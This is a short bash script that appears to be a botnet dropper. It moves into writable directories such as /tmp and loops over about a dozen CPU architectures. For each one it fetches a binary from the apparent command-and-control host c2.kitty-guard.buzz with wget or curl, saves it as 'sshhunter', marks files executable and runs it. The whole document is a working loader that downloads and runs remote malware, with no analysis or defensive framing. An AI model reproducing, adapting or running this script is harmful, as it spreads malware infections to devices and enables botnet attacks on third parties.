#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; for arch in arm arm5 arm6 arm7 m68k mpsl sh4 x86_64 mips ppc x86; do wget http://c2.kitty-guard.buzz/main_$arch || curl -O http://c2.kitty-guard.buzz/main_$arch; cat main_$arch >sshhunter; chmod +x *; ./sshhunter $arch.sshhunter; done
